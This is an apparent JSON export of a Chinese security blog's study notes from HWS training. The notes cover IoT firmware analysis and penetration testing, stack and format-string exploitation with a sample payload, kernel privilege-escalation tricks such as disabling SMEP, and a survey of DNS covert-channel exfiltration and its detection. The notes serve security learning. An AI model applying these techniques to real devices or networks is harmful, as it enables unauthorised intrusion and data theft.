[{"id":"d59f5c6d4a0d11f67f415ffc1f13370a","title":"IoT硬件安全基础","content":"\n\nIoT介绍\n\n\n\n\n\n\n\n\nIoT定义：从设备侧来说，是可以联网的嵌入式设备，是一个完整的计算机\n\n\n\n\n\n\n\n\n\n嵌入式定义：从计算机角度来说，就是能控制更多种类的外设计算机\n固件获取与解包固件固化在设备上的软件，是会被某个CPU执行的代码，一般指Flash中被固化、固定执行的软件（烧到板子上的）\n固件获取固件获取：1.官网；2.DIY论坛；3.搜索；4.渗透；\n获取更新包：1.触发更新（被动/主动）；2.更新检测（抓流量看如何更新）；3.下载固件\nFlash读取：1.读板子（了解板子上每一块硬件单元的功能）；2.存储芯片；3.编程器（烧录的工具）\nshell打包、binwalk解包（ubireader、mount）、解密、\n\n\n\n\n\n\n\n\n\n例子：D-Link DIR-882\n固件逆向分析攻击面攻击面：设备对输入进行处理的全流程\n\n输入意味着有接口\n处理意味着有逻辑\n\n分析输入\n固件设备：启动脚本/etc/init.d，常见的服务二进制（boa，Lighttpd）\n在线设备（无shell）：端口扫描\n在线设备（有shell）：进程（ps），网络（netstat -pantu）\n\n找到边界面（即在程序代码和硬件之间的那些代码，或者说控制硬件的代码）、递归查找字符串（查找关键符号和通信协商）、漏洞挖掘（内存破坏、逻辑漏洞）\n流量调试信道与基操流量基本操作：收、发、抓、断、改\n主信道：1.网络（TCP/IP）；2.无线（蓝牙，WiFi，NFC，GPS等）；3.有线（USB）\n流量调试（收发）nmap全端口扫描\nsudo nmap -sU -sT -p0-65535 192.168.1.1\n\n\n\n\n\n\n\n\n\n\nudp扫描怎么判断端口关闭的：icmp包（tcp通过rst报文）\n\n\n\n\n\n\n\n\n\nudp扫出来的端口是服务端还是客户端：都有\n\n\n\n\n\n\n\n\n\n内网里能不能给udp客户端端口发消息：可以\n有shell看端口\n攻击信道（抓）目标路由可达：接入网络、socket编程、收发包即可\n目标在内网：1.打掉内外网边界，挂代理，使目标可达；2.想办法让payload进入目标收包信道\n举例树莓派抓包\nssh root@192.168.1.1 \"ifconfig br-lan promisc &amp;&amp; tcpdump -i br-lan 'tcp port ! 22' -s 0 -w-\" | wireshark -k -i -\n\n断改包必然基于中间人，但是如何给设备换证书是个问题（websocket-&gt;openwrt(redsocks2) + burpsuite）\nWIFIwireshark只能抓到TCP的流量，抓不到WIFI协议的，原因是被驱动过滤了（MacOS可以直接抓）\n原因：1.不同层次的数据变换可能不是简单的加封装头；2.通信是一个过程，同一个数据在过程中有不同的生命状态\n收发：esp8266、Aircrack-ng官网可以直接发链路层的裸包\n抓包：Aircrack-ng、MacOS可以用wireshark抓\n相关研究：project zero（2017.04）、Niay Artenstein（2017.07）、keen（2020.01）、project zero（2020.12）、fuzz（www.github.com/aircrack-ng/mdk4）\nNFC工具：MIFARE Classic Tool、PM3、变色龙\nAPP本质：手机提供的NFC接口，控制NFC外设，最灵活\n抓包：Smartspy+、PM3\n断改包：多一部手机模拟卡，充当中间人改包www.github.com/nfcgate/nfcgate\n其他研究：三星手机变NFC（https://www.4hou.com/posts/z9w8）、NFC控制器（https://github.com/Iskuri/Samsung-NFC-Controller-Reverse-Engineering）、TRF7960\n\n\n\n\n\n\n\n\n\nUSB攻击：https://github.com/hhj4ck/FreeBuds3\n动态调试代码三种生命状态：源代码、二进制、运行时\n获得调试接口：UART、JTAG、Coresight（ARM）\n模拟：QEMU（qemu-user、qemu-systeem）、firmadyne（https://github.com/firmadyne/firmadyne）、FAT（https://github.com/attify/firmware-analysis-tookit）、FirmAE（https://github.com/pr0v3rbs/FirmAE）、Unicorn（https://github.com/unicorn-engine/unicorn）、qiling（https://www.qiling.io/zh）\n调试器：GDB调（把gdbserver扔到固件上开个端口，用电脑调）\n若没有调试器（架构比较诡异）：盲打（https://github.com/hhj4ck/checkm30）、自己做（ThreadX、VxWorks）、模拟（tile）\n推荐阅读/工具https://busybox.net/downloads/binaries/\nhttps://xuanxuanblingbling.github.io\nhttps://www.zhihu.com/question/21045562/answer/36673069\n","slug":"HWS/2021/IoT硬件安全基础","date":"2022-02-05T01:09:27.000Z","categories_index":"HWS/2021","tags_index":"HWS","author_index":"S1eepy"},{"id":"5fc856885126d17b63352c1a2dc49ef9","title":"PWN","content":"\n\nPWN题目中直呼精彩的利用手法程序没有leak时的利用技巧\n\n\n\n\n\n\n\n\n例题：Magic Gadget\nret2csuret2libsyscallpartial overwrite覆盖低位字节，达到不需要leak也可以修改目标值，可能存在一定爆破\n通过House of Husk 入门IO_FILEhttps://ptr-yudai.hatenablog.com/entry/2020/04/02/111507\n寄，发现是堆的内容，开摆\nSROP及扩展Kernel PWN内核基础保护机制\nSEMP禁止在内核态下执行用户空间的代码\nSMAP禁止在内核态下直接访问用户空间的内存（其与上一条均需CPU硬件支持）\nPTI保护机制，将内核和用户空间的映射表隔离，处于内核态时不能直接处理用户态的地址\n\n保护绕过\n一般系统根据CR4寄存器判断SMP保护是否开启，当CR4寄存器第20位值为1时保护开启，只需要mov cr4, 0x6f0即可关闭\nPIT会触发SIGSEGV异常，直接patch异常可以绕过，要在iret指定返回用户态后\n提权：commit_creds(prepare_kernel_cred(0));、modprobe_path劫持、task_struct劫持+prctl\n\n内核利用stack利用","slug":"HWS/2021/PWN","date":"2022-02-04T07:03:52.000Z","categories_index":"HWS/2021","tags_index":"HWS","author_index":"S1eepy"},{"id":"4946ce3f910e8961231b36c71843c41e","title":"IoT漏洞挖掘","content":"\n\nIoT固件安全之漏洞挖掘常用组件中的漏洞品发点web管理服务uhttpd最常用的服务\n\n历史漏洞：CVE-2019-19945、CVE-2018-19630\n主流组件漏洞：LuCI（CVE-2019-17367、CVE-2019-12272）、UCI（CVE-2020-28951）\n二次开发过程中漏洞频发点：审计CGI、Lua、PHP\n\nthttpd/minihttpd\n历史漏洞：\n二次开发过程中漏洞频发点：thttpd对header内容无检查\n\nlighttpd\n历史漏洞：CVE-2018-18878、CVE-2015-1548\n二次开发过程中漏洞频发点：\n\nGoAhead\n历史漏洞：CVE-2019-5096、CVE-2017-17562\n二次开发过程中漏洞：goform Handler、asp Handler、security Handler、\n\n厂商自研\nMoxaHttp\nZTE Mini Web\n\n常用组件的漏洞频发点UPNP服务\nMiniupnp/MiniDLNA：CVE-2020-28926、CVE-2019-12106、CallStranger\nLibupnp：CVE-2020-13848、CVE-2016-8863\n各厂自研…\n\nRTSP服务\nLive5555\nHiChipSDK\n各厂自研…\n\nCVE-2020-14472/14473Step0：寻找合适的攻击面\n\n\n\n\n\n\n\n\n\n\nNmap扫描端口\n不考虑vpn相关端口（安全性较高）\nHTTPS与HTTP：存在lighttpd二次开发，因此重点关注\n\nStep1：固件解包，上官网找固件\n\n\n\n\n\n\n\n\n\n\n先binwalk分析、只有一个ubi、用ubireader提取\n提取后就是一个linux文件系统\n在/etc/init.d下的rcs和rc.d查看启动项\n查找web管理端（httpd）是否在默认启动项\n查看接口，在www/cgi-bin目录下，用ida直接分析\n\nStep2：静态逆向分析\n\n\n\n\n\n\n\n\n\n\n以web管理服务为目标\nLighttpd与CGI\n\nWMCTF camera","slug":"HWS/2021/IoT漏洞挖掘","date":"2022-02-04T02:13:10.000Z","categories_index":"HWS/2021","tags_index":"HWS","author_index":"S1eepy"},{"id":"c9203e32c2797e4aca5216137b90ff82","title":"物联网渗透","content":"\n\n物联网渗透物联网设备安全概述物联网设备层次模型\n物理感知层（固件提取、硬件攻击）\n通信层（流量监听、中间人攻击）\n管理控制层/应用层（web、rtsp、ssh…）\n\n物联网设备通信模型云端，设备，移动端相互进行通信，三者各面临风险\n\n云端安全风险\n客户端（APP）安全风险\n设备自身安全风险\n\nIoT设备信息收集\n端口扫描（nmap、netstat等）：常规端口扫描、指定udp扫描（IoT使用私有协议比较多）\n流量抓取、分析（外部嗅探/内部测试）：wireshark、tcpdump\n功能点评估（web服务等）：\n……\n\n涉及知识\n渗透测试\n二进制逆向分析\n硬件拆焊\n……\n\n使用到的工具\n反汇编：IDA/Ghidra\n流量分析：wireshark/tcpdump/Burp suite\n固件分析工具：binwalk/qemu（固件模拟）\n\n物联网设备漏洞点分析例如获取固件的web后台后，可能有的敏感操作有后台抓包、网络诊断（调试）、导出配置文件\n漏洞风险\n后台web安全漏洞\n逻辑漏洞（类似web的逻辑漏洞）\n固件二进制漏洞\n通信/私有协议漏洞\n云端安全风险\n后门漏洞风险\n\nWeb安全漏洞未授权访问：认证绕过（敏感路径绕过、cookie伪造、其他）、弱口令（门槛低，灰产利用广）\n弱口令：任意密码登录、常见密码爆破、github上DefaultCreds-cheat-sheet\n命令注入：例如在后台进行网络诊断时，路由器可能会对外发送ping命令，可以尝试命令注入\n\n\n\n\n\n\n\n\n\n案例1：-D-Link 850L未授权伪造全局变量\n\n\n\n\n\n\n\n\n\n案例2：-D-Link DCS-2530L访问未认证敏感路径\n\n\n\n\n\n\n\n\n\n案例3：Tenda系列路由器前台未授权\n\n\n\n\n\n\n\n\n\n案例4：Rtsp服务未授权访问（RTSP视频实时流传输协议、常开放在554端口，网上有常见网络摄像头端口及RTSP地址）\n二进制漏洞研究步骤：固件获取 - 固件解包 - 提取待分析程序 - 逆向分析\n常见漏洞：栈溢出、拒绝服务（大部分是指针异常）\n\n\n\n\n\n\n\n\n\n案例1：D-link DIR-815路由器，http协议cookie字段栈溢出\n\n\n\n\n\n\n\n\n\n案例2：思科RV110w路由器栈溢出，在guest_logout.cgi路径存在栈溢出\n后门漏洞\n服务访问后门（web服务、rtsp服务等）：某IPC摄像机RTSP服务认证代码逻辑\n调试后门（软/硬件）：某摄像机9530端口存在调试后门、Zyxel防火墙设备ftp调试后门、\n……\n\n逻辑漏洞\n任意文件读取：路径穿越、符号链接漏洞\n任意密码重置\n\n云端安全风险\n传统web安全\n越权访问\n\n物联网设备常见漏洞挖掘方法\n固件逆向分析之分析输入点：寻找二进制中统一的cgi输入接口函数\n固件逆向分析之敏感函数/代码段回溯\nfuzz（通信协议、固件）\n\n","slug":"HWS/2021/物联网渗透","date":"2022-02-04T01:05:46.000Z","categories_index":"HWS/2021","tags_index":"HWS","author_index":"S1eepy"},{"id":"5fc856885126d17b63352c1a2dc49ef9","title":"PWN","content":"\n\n栈溢出Linux保护技术概述Linux常见的保护机制\n\nCanary：函数开始时向栈内插入canary值，返回时查询canary是否合法，以防止栈溢出（-fstack-protector 开启）\nFortify：防止格式化字符串漏洞，包含%n的格式化字符串不能位于程序内存中的可写地址；使用位置参数时，必须使用范围内的所有参数，如果要使用%7，必须同时使用1x-$6x\nNX/DEP：将数据虽在的内存页标识为不可执行，阻止执行shellcode（-z execstack 开启）\nPIE/ASLR：使得程序地址空间分布随机化，增加ROP利用难度（-pie-fPIC 开启）\nRELRO：设置符号重定向表为只读，并在程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击（-z lazy/now 开启）\n\n函数调用/退出时栈的变化栈结构不在讲了，另一篇写了，提一下栈传参，在x86中函数参数直接保存到栈上，在x64中会先保存到六个寄存器里，寄存器用完再向栈保存\n调用函数时，栈的变化：\n\n首先执行call funcname 这一指令，其效果相当于两条指令，即先push retaddr（将下一条指令地址压栈，用于返回时的跳转）jmp xxx（跳转到函数去执行）\n然后push rbp（保存上一个栈的状态），mov rbp, rsp（把栈底抬上去），sub rsp, XXh（预留栈空间）\n\n函数退出时，栈的变化：\n\n执行leave指令，相当于两条指令，先mov rsp, rbp（把rsp压回去，退栈），pop rbp（恢复栈状态）\n执行ret指令，相当于pop rip（将之前压栈的返回地址还给rip继续执行）\n\n栈溢出向栈中写入变量超过了本身的执行限制，若写到了函数原本保存rip的位置，那么就可以控制程序执行\n对抗DEP/NX保护先从最基础的利用讲起\nret2text代码内本身有后门函数，可以控制rip返回到后门函数中\nret2shellcode代码内一般是没有合适的代码，那么就需要手动写入shellcode，一般会有可以写入的在bss段的变量，写入之后通过栈溢出跳转到shellcode进行执行，关键是shellcode需要有可执行权限\nROP有了NX保护之后，堆、栈、bss段都没有了可执行权限，可以通过ROP绕过，主要思想是在栈溢出的基础上，利用程序中已有的gadgets来改变某些寄存器或者变量的值，从而控制程序的执行流程。gadgets本质是以ret结尾的指令序列（因为ret本质相当于pop rip，而rip可以通过栈溢出修改）。\n利用条件：存在栈溢出能控制返回地址；可以找到满足条件的gadgets以及相应的gadgets地址\n利用方法(rop链)：精心设计栈结构，将多个gadgets用ret指令链接起来，构造执行\nret2libc用got表泄漏libc地址然后找到system函数地址和/bin/sh地址劫持\n对抗ASLR/PIE保护如果需要跳转的目标函数(system)在程序中没有的话怎么办，事实是libc里啥函数都有，只要知道函数在libc的地址即可\nASLR/PIE保护技术使得程序基地址和libc基地址每次加载的都不一样\n延迟绑定机制在函数第一次被用到之后才进行绑定，执行一个dl_resolve的过程，将函数在libc里的真实地址填回到got表中\n利用思路\n泄漏GOT表中某个函数的libc地址\n在libc中找到system, ‘/bin/sh’和上述函数的相对偏移\n得到system和’/bin/sh’的地址\n构造ROP链利用\n\n终极偏移=libc基址+库内函数相对偏移\nsystem=libc基址+system在库内相对偏移\n'/bin/sh'=libc基址+'/bin/sh'在库内相对偏移\n\n与上述ret2libc结合理解\n对抗Canary保护回忆一下栈结构，canary相当于在函数栈帧和rbp之间插入了canary，要覆盖rbp和rip一定会覆盖掉canary，函数在结束时会检查canary的值以判断是否溢出\n对抗方法\n泄漏canary值：\n泄漏或覆盖fs:28h内的值（fs:28h就是验证时对比的值）\n劫持stack_chk_fail函数（修改GOT表中存储的stack_chk_fail地址）\nstack smashing：__stack_chk_fail函数会打印出argv[0]，可以用其泄漏内存地址信息\n逐字节爆破（BROP）：需要确定程序重启后canary不变\n\nBROP1.判断栈溢出长度：可以暴力枚举，找到程序崩溃的长度\n2.逐字节爆破canary：变动canary的逐个字节，爆破出canary\n3.寻找stop gadget：改变返回地址之后，执行跳到了某个等待输入的区域，称这一区域为stop gadget，可以通过爆破找到stop gadget。（可以将所有的dead位置替换为stop gadget，便于调试）\n4.寻找useful gadget：可以操作寄存器的gadget\n5.寻找可用的PLT表项：\n6.利用PLT表中的puts函数，配合useful gadget来远程dump信息\n栈利用拓展\n\n\n\n\n\n\n\n\n溢出长度不足？在bss段等已知位置进行写入，提前进行栈布局，然后通过覆盖栈上存储的saved rbp和saved rip把栈劫持到写入位置，关键是把rsp的值劫持到写入位置\n\n\n\n\n\n\n\n\n\nSROP：没有PLT表，利用sigreturn系统调用（控制栈指针，将原来的rip指向syscall gadget换成syscall; ret gadgeet）\n\n\n\n\n\n\n\n\n\nWindows canary：可以算出来canary=__security_cookie ^ ebp，学习Windows的异常处理结构\n\n\n\n\n\n\n\n\n\nlinux内核：linux内核的保护机制更多，限制也更多，例如SMEP（类似于NX）\nret2user（内核栈溢出）在没有保护的情况下，直接将返回地址覆盖为用户态调用commit_cres(prepare_kernel_cred(0));的函数的地址进行提权，然后使用iretq指令从内核态返回用户态从而getshell。\n开启了SMEP，没有开启KALSR、canary，可以构造ROP，有两种思路：1.利用ROP直接执行commit_cres(prepare_kernel_cred(0));然后iret返回用户空间。2.利用ROP设置cr4寄存器，关闭smep，进行ret2user攻击。\n格式化字符串漏洞主要是printf函数家族的问题，这些格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的函数\n正常例子\nprintf(\"Color %s, Number %d, Float %.42f\", \"red\", 123456, 3.14);\n//output: Color red, Number 123456, Float 3.14\n\n\n\n\n\n\n\n\n\n\n重要特性：printf()函数的参数个数不确定，将其分为两部分（第一个参数为参数中的格式化字符串的数目决定了后续的参数个数）\n注意参数的入栈顺序，是从函数最右边的参数开始入栈，比如上述例子，最先入栈的参数是3.14，最后入栈的是格式化字符串\n若第一个参数被控制，那么可以输入任意个参数，从而可以将内存(栈)中的其他量打印出来，可以用此泄漏栈信息\n结合%s利用：%s是将对应的参数当做一个地址来解析，输出其地址对应的数据，结合%s可以进行任意地址信息泄漏\n结合%n利用：%n是把前面已经输出的长度写入某个内存地址，利用%n可以向内存中写入值，（方便起见可以用宽度字符%.100d这样的来填充长度）\nint num=66666666;\nprintf(\"Before: num=%d\\n\", num);//Before: num=66666666\nprintf(\"%d%n\\n\", num, &amp;num);//66666666\nprintf(\"After:num=%d\\n\", num);//After:num=8(之前输出的长度为8)\n//%.100d%n的使用\n//%11$n=%x%x%x%x%x%x%x%x%x%x%n\n//%n:dword:4bytes; %hn:word:2bytes; %hhn:byte:1bytes\n\n利用例子把0x6a686664写入地址0x08045566\npayload如下\n\\x66\\x55\\x04\\x08\\x67\\x55\\x04\\x08 //向四个地址输入，小端序\n\\x68\\x55\\x04\\x08\\x69\\x55\\x04\\x08\n%84c%4$hhn //此时之前四个地址已经16个字节，再输出84个字节，即可对其100个字节，那么输入的值就是0x64(十进制100)\n%2c%5$hhn //再加二，输入0x66，若小余0x64，可以溢出0xff，因为hhn只能输出后1bytes，故溢出的会丢弃\n%2c%6$hhn\n%2c%7$hhn\n\nFortify保护主要用来防止格式化字符串，如果要使用%7，必须同时使用-%6$\ndl_runtime_resolve高级利用ret2_dl_runtime_resolve，只需要可执行程序，不依赖libc的攻击手法\nELF基本结构ELF由ELF头，程序头部表和其对应的段，节区头部表和其对应的节组成。若elf文件参与了动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节区，结构如下\ntypedef struct {\n\tElf32_Sword d_tag;\n\tunion{\n\t\tElf32_Word d_val;\n\t\tElf32_Addr d_ptr;\n\t} d_un;\n}Elf32_Dyn;\n\n其中tag对应着每个节区，比如JMPREL对应着.rel.plt节区；节区中包含目标文件的所有信息，其中类型为REL的节区包含重定位表项；.rel.plt用于函数重定位，.rel.dyn用于变量重定位\n首先用r_info这个信息，算出函数在dynsum结构体里的偏移，而r_offset是got表的偏移，\n听不懂了，一堆结构体乱指乱引用太长了捋不清，就不记了，等什么时候再见再说吧\n漏洞利用流程\n控制EIP为PLT[0]的位置们只需传递一个index_arg参数\n控制index_arg的大小，使reloc的位置落在可控地址内\n伪造reloc内容，使sym落在可控地址内\n伪造sym内容，使name落在可控地址内\n伪造name为任意库函数名称，如system\n\n堆溢出寄，这一块讲的不太基础，听了一半云里雾里直接放弃了，等再找个好点的更到pwn的笔记里\n堆概述程序运行时，堆提供动态分配的内存，允许程序申请大小未知的内存。堆是虚拟地址空间中一块连续的限行区域，由低地址向高地址生长。堆主要有两项工作：1.响应用户申请内存的需求，向操作系统申请内存，返回给用户；2.管理用户释放的内存，释放的内存不是直接返还给操作系统，而是由堆管理器管理，响应用户新申请的请求\nmalloc(size_t n)申请内存：n=0会分配最小内存块，n&lt;0一般会失败（因为size_t是无符号，负数会很大）\nfree(void* p)释放内存：p为空时无操作，若p已经被释放会有很奇怪的效果\n内存分配背后的系统调用malloc和free函数背后的调用逻辑：glibc先调用__brk系统调用，返回给下一片可以使用内存的堆的地址，然后用mmap拿到该地址，作为堆的内存给用户使用\n堆的一些常用的数据结构\nmalloc_chunk结构\nbin结构\narena结构\n\n堆的结构\n","slug":"HWS/2020/PWN","date":"2022-02-03T01:26:30.000Z","categories_index":"HWS/2020","tags_index":"HWS","author_index":"S1eepy"},{"id":"c4f987dd8b0d0b7837851ac5e86e8a3e","title":"DNS隐蔽信道综述","content":"\n\nDNS隐蔽信道综述本篇写为阅读《DNS隐蔽信道综述》的笔记，由于DNS以及DNS隧道相关内容在另一篇已经写过，就尽量减少重复了，可能有部分内容会减少提及。\n\n\n\n\n\n\n\n\n\nDNS隐蔽信道（DNS covert channel，DCC）\n本文贡献1.对DCC的威胁模型进行了归类总结；对DCC的发展历程进行了全面梳理\n2.对DCC概念进行了形式化定义；对构建机理进行了深入剖析\n3.总结DCC难以绕过的异常点，对异常点进行了分析；对传统检测方法以及人工智能赋能的检测方法涉及的具有代表性的论文进行了总结梳理，指出现存问题\n4.对未来的发展趋势进行了展望\nDNS威胁模型与发展历程DCC威胁模型DNS协议具有泛在性、隐蔽性，将DCC分为两种类型\n\n\n\n\n\n\n\n\n\n直连信道：受害设备通过IP地址直接与恶意权威名称服务器(MANS)相连，这种情况下一般使用RawUDP字段传输信息\n中继信道：受害设备通过本地默认解析连接到MANS，一般使用QNAME字段及RDATA字段传输信息\n前者较为简单，主要讨论后者所设计的命令控制、数据泄漏2种威胁场景\n威胁场景\n\n\n\n\n\n\n\n\n命令控制：受害设备向MANS请求控制命令，MANS收到后将欲下发的命令进行处理，利用DNS响应向受害设备发出命令，受害设备解码获得命令并执行\n数据泄漏：攻击者利用DNS查询请求将待传送的数据如敏感信息、文件等传送到其搭建的MANS\n发展历程就不复述了，帖张图，感兴趣的可以去看论文\n\nDCC构建机理DCC定义DCC由以下七元组构成\n1)VictimMachine指感染了DCC恶意软件而可利用DNS数据报传输数据的受害设备集合，可以是任何具备计算能力能发起DNS查询请求的设备,记为\n\nDCCMalware表示运行在受害设备上的恶意程序集合\nS表示DCCMalware的状态集合\nACTIVITY表示DCCMalware的动作集合\n\n2)DDP指的是可定义的DNS数据包，记为\n\nQNAME表示传送信息进行处理后嵌入DNS查询的QNAME字段中\nRDATA表示嵌入RDATA字段中\nRawUDP表示数据嵌入DNS分组payload结束与UDP分组payload结束为止的空间中\n\n3)CMD表示恶意程序(DCCMalware)可执行的控制命令集合，记为\n4)POLICY表示保证数据高效可靠传输的策略，记为\n5)MANS表示恶意的DNS服务器\n6)ConnectionType表示连接类型，指受害设备与MANS的连接类型，分为中继信道与直连信道\n7)表示转换函数，反映了恶意程序收到命令后产生的响应动作以及状态变迁，记为$\\delta:DCCMalwareSCMD\\rightarrow DCCMalwareSACTIVITY，并满足\\delta(dccmalwares_icmd)=(dccmalwares_jactivity)，i\\neq j$\n构建机理\n攻击者首先控制VictimMachine，让其感染DCCMalware，然后与其控制的MANS进行交互\n通过POLICY定制的传输策略，将信息嵌入DDP传输，建立起攻击者与受控设备可靠、隐蔽的通信桥梁\nVictimMachine可以通过该信道向MANS泄露信息，MANS可以通过该信道向VictimMachine发送控制命令\n\n对DNS协议分析后发现，查询区域中除了QNAME字段，其他字段很少被利用(因为内容固定或者可变动字符少)\n故QNAME字段为该区域待传送信息嵌入的最佳位置，应答区域中RDATA字段为该区域信息嵌入最佳位置。\n基于QNAME嵌入的数据回传将带传输数据嵌入DNS协议查询区域的QNAME字段中，可以将数据根据POLICY处理后嵌入。嵌入需遵循QNAME字段规范，具有标签，标签间由句点间隔。\n将DNS查询包构造完成后，利用DNS查询请求将其传输到攻击者搭建的MANS；MANS接收识别DNS查询请求包，从QNAME字段中按照对应的POLICY提取并恢复数据，得到欲泄漏的敏感信息或窃取的重要文件等。\n基于RDATA嵌入的命令获取将待传输数据嵌入DNS协议应答区域的RDATA字段中，根据请求确定响应资源记录类型。\n构造完成DNS响应包后将其发送至受害设备，受害设备接收识别DNS，从RDATA字段中按照对应的POLICY提取并恢复控制命令，得到rdata-derived cmd。DCCMalware根据rdata-derived cmd通过产生响应动作以及状态变迁。\n二者的关系基于QNAME与基于RDATA二者有一定关系但是并不相同。前者主要利用查询泄漏数据，后者主要利用应答获取命令。\n基于QNAME嵌入的数据回传主要为将处理后的数据利用DNS查询的QNAME字段进行泄漏，对应的DNS响应一般为固定或连续的IP地址应答。\n基于RDATA嵌入的命令获取主要为将处理后的数据利用DNS相应的RDATA字段进行传输，进而使受害设备可以通过响应获取命令，与响应对应的查询本身不用来泄漏过多的数据，而是一种获取命令的请求方式\nDCC的高效可靠通信策略由于UDP是不可靠传输，在传输过程中使用POLICY保障可靠传输\n\n加入辅助传输字串(冗余校验CRC)保证完整性\n在子域名/应答资源记录嵌入过程中，引入编码机制\n\nDCC的检测方法异常点DCCMalware构建的DNS查询与正常的DNS数据报必然有所差别，由于DNS协议信息承载量较小，那么想要传输大量MB级别的文件，必然会发起数十万甚至百万的DNS请求；同时需要对内容进行编码，这必然会导致异常。因此可以根据异常点进行检测，目前的检测主要针对DDP及请求应答情况的异常进行分析。异常特征概括为单域名异常及多域名统计异常两类。\n单域名异常异常点反应在基础特征、可读性特征、结构性特征三个方面\n基础特征\nDNS数据包长度/UDP长度。正常情况下DNS分组载荷结束与UDP分组载荷的结束位置一致，但是攻击者为了传输信息可能会再DNS分组载荷结束与UDP分组载荷结束之间嵌入数据，造成与正常数据包的差异\n子域名长度。攻击者将带泄露数据处理后嵌入QNAME字段传输，一般会放入尽可能多的数据以提高带宽，导致恶意域名会远远长与正常的子域名\n子域名数字/大写字符的数量/占比。数据编码后会产生大量数字和大写字符，正常情况下域名不含有大写字符和数字\n子域熵。正常域名看起来通常有意义，但是编码后的恶意域名一般熵更大\nC2域名欺骗性。攻击者为了使C2域名看起来更正常，会使MANS注册更具有欺骗性的域名，比如google.com和go0gie.com，看起来相似\n资源记录分布及长度。通常请求记录为A/AAAA记录，而DCCMalware使用的资源记录通常是TXT、CNAME记录\n\n可读性特征\n子域名包含单词数、子域名中最大单词长度。正常子域名一般是由多个单词构成，且最大单词长度十分合理。而恶意域名中提炼不出单词，或者最大单词长度异常\n子域名单/双/三字母频率。正常子域名一般属于自然语言遵循Zipf定律，而恶意子域名字符频率分布更加均匀\n\n结构性特征\n子域名标签数量。正常子域名标签较少，恶意域名的标签较多。比如正常map.baidu.com，而异常的例如ALMA Dot子域名有七个标签\n平均/最大标签长度。正常子域名标签一般较短，而恶意的子域名可能含有较长的标签长度。例如正常tieba.baidu.com中tieba仅5个字符，而Glimpse查询中的第二标签有60个字符\n\n多域名统计异常\n同位相同字符数/最大公共子串长度。同位相同字符指两个域名相同位置的字符相同，最大公共子串指两个域名所有公共子串中最长的公共子串长度。正常子域名没有固定结构，而恶意活动中的子域名一般具有相同的结构\n最大公共子串是否包含数字/字母。正常域名一般不具有相似的结构特征，而恶意活动的恶意域名一般具有相似的结构\n同域IP离散性。正常域名对应的IP地址较离散，而恶意域名一般会让IP固定或者IP递增\nDNS数据包综述。正常情况下，每天的DNS数据包会在一个固定范围内，当DCCMalware运行时，会产生大量DNS查询\nDNS请求频率。正常情况下一般是手动发起DNS请求，频率有限，而恶意攻击传输大量文件时，会产生大量的DNS请求\nDNS请求应答比。正常情况下DNS请求应答比接近1:1，而恶意攻击的DNS请求一般不设置应答，大量的无应答请求构成异常\n应答码。正常DNS请求的应答码一般为0，表示请求应答过程成功完成；而应答码为3时表示此域名没有任何类型的解析记录。而Heyoka将响应码设置为3的简单NXDOMAIN应答，利用其传输数据会伴随大量的NXDOMAIN响应\n同域请求数量/占比。一般情况下正常域不会被同一设备经常反复查询；而恶意软件需要对同一域名反复查询来泄露信息\n\n传统检测方式2010年Born等，用域名单字母、双字母和三字母字符频率检测DCC。原理是自然语言遵循Zipf定律，而隐蔽信道字符频率更均匀。该文使用n-gram字符频率分析方法，清晰地显示了合法流量和隐蔽信道传输数据的区别\nKarasaridis等提出了一种基于流的检测方法，根据DNS数据包大小分布差异性和交叉熵等统计属性近试试检测异常\n2013年Ellens等，结合了流量信息和统计方法进行异常检测，特别在流方面使用了每个流的字节数、每个流的数据包数、每个数据包的字节数和流的持续时间等特征。使用方法有阈值法、Brodsky-Darkhovsky法、分布法结合，共实现了五个检测器适用不同场景\n2014年Kara等，全面分析了恶意payload的分布位置，提出了基于资源记录分布情况来检测DCC的方法\n经典的机器学习方法传统检测一般利用基于规则的静态阈值，检测方法不灵活、误报率高、易被绕过。\n非监督学习2011年Dietrich等，提出利用RDATA差异性及通信行为差异性两方面的特征，使用K-均值聚类的方式在网络流量中检测C&amp;C信道\n监督学习\n\n\n时间\n作者\n算法\n贡献/备注\n\n\n\n2013\nAiello等\n传统贝叶斯\n将传统贝叶斯引入DCC检测，使用12个特征检测\n\n\n2013\n章思宇等\nJ48决策树、朴素贝叶斯、逻辑回归\n提取可区分特征12个\n\n\n2016\nBuczak等\n随机森林\n\n\n\n2017\nLiu等\n支持向量机(SVM)、决策树、逻辑回归\n综合了四种特征(18种行为特征)，指出SVM效果最佳\n\n\n2018\nAlmusawi等\n多标签支持向量机\n与多标签贝叶斯分类器比较，还对其他协议进行了分类\n\n\n2019\nNadler等\niForest(孤立森林)\n7种特征训练正常流量，识别工具及软件的恶意流量\n\n\n2020\nAhmed等\niForest\n描绘了科研机构网络与校园网DNS流量各项特征的密度图，基于密度图提出检测特征\n\n\n经典机器学习总结目前论文涵盖了监督学习和非监督学习，作者们比较青睐决策树和SVM算法，训练集有已知有位置，有使用隐蔽信道工具\n深度学习检测方法\n\n\n时间\n作者\n算法\n贡献/备注\n\n\n\n2019\nLiu等\nCNN\n将流量以字节码为单位转换成向量矩阵，并与SVM及逻辑回归等方式进行对比\n\n\n2020\n张猛等\nRDCC-CNN\n提取了48个表征元素，将其转换成灰度图片表征DNS流量数据\n\n\n2020\nWu等\nCNN\n学习正常DNS流量的特征，通过计算正常样本与恶意样本之间的均方误差来检测\n\n\n后续阅读推荐LIU C, DAI L, CUI W J, et al. A byte-level CNN method to detect  DNS tunnels[C]//2019 IEEE 38th International Performance Computing  and Communications Conference. Piscataway: IEEE Press, 2019: 1-8. \n张猛, 孙昊良, 杨鹏. 基于改进卷积神经网络识别 DNS 隐蔽信道[J].  通信学报, 2020, 41(1): 169-179.  ZHANG M, SUN H L, YANG P. Identification of DNS covert channel  based on improved convolutional neural network[J]. Journal on Com\u0002munications, 2020, 41(1): 169-179\nWU K M, ZHANG Y Z, YIN T. TDAE: autoencoder-based automatic  feature learning method for the detection of DNS tunnel[C]//2020  IEEE International Conference on Communications. Piscataway: IEEE  Press, 2020: 1-7.\n","slug":"Research/Paper/DNS隐蔽信道综述","date":"2022-02-02T11:32:39.000Z","categories_index":"Research/Paper","tags_index":"Research 